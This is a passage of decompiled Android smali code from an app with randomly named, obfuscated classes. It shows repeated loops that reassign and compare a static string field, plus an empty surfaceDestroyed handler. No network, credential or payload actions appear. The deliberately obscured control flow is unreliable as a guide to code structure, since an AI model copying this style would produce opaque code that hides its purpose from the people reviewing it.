    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    move-object p1, v5

    goto :goto_8

    .line 712
    :cond_10
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_8

    .line 715
    :cond_11
    :goto_9
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_13

    .line 717
    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 718
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {p1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_12

    .line 720
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    move-object p1, v5

    goto :goto_9

    .line 727
    :cond_12
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_9

    .line 730
    :cond_13
    :goto_a
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_15

    .line 732
    sput-object v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 733
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {p1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_14

    .line 735
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    move-object p1, v5

    goto :goto_a

    .line 742
    :cond_14
    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_a

    :cond_15
    :goto_b
    return-void
.end method

.method public surfaceDestroyed(Landroid/view/SurfaceHolder;)V
    .locals 0

    return-void
.end method
